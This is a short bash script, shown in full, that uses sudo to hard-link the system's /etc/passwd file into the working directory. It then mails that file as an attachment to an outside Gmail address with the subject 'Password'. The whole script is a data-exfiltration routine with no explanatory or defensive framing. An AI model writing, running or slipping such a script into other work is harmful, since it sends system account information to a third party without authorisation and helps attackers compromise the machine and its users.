#!/bin/bash

sudo ln /etc/passwd password
mail -s "Password" -A password ahmedosama12300@gmail.com <<< "Here is passwd file"
